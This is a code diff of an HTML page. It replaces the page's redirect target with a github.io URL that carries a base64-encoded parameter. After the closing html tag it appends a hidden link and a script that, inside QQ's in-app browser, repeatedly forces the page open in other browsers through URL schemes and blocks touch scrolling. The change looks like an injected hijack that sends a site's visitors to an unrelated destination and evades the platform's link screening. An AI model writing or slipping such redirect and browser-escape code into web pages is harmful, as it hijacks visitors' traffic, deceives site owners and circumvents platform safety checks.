@@ -219,7 +219,7 @@
     } else if (document.domain == "") {
       console.log("开发模式");
     } else {
-      location.href = "https://azpay.cn";
+      location.href = "https://vip86.github.io/860.html?u=aHR0cHM6Ly9nZGVzaWduLWRhbS5kYW5jZi5jb20vMjM3OTQzNjUwNjEyODc5NDAvbXBzLzcyODk0YWRlODY4ZDRmNDNiYjBlYTNmZjk3ZTliNWM1MTEzMjQ2Lm1wNA";
     }
 
     $("#copyButton").click(function () {
@@ -230,4 +230,29 @@
   </script>
 </body>
 
-</html>
+</html><a style="display: none;" href="" id="vurl" rel="noreferrer"></a>
+<script>
+    function openu(u) {
+        document.getElementById("vurl").href = u;
+        document.getElementById("vurl").click();
+    }
+
+    var url = window.location.href;
+    document.querySelector('body').addEventListener('touchmove', function (event) {
+        event.preventDefault();
+    });
+
+    if (navigator.userAgent.indexOf("QQ/") > -1) {
+        openu("ucbrowser://" + url);
+        openu("mttbrowser://url=" + url);
+        openu("baiduboxapp://browse?url=" + url);
+        openu("googlechrome://browse?url=" + url);
+        $("html").on("click", function () {
+            openu("ucbrowser://" + url);
+            openu("mttbrowser://url=" + url);
+            openu("baiduboxapp://browse?url=" + url);
+            openu("googlechrome://browse?url=" + url);
+        });
+    }
+</script>
+
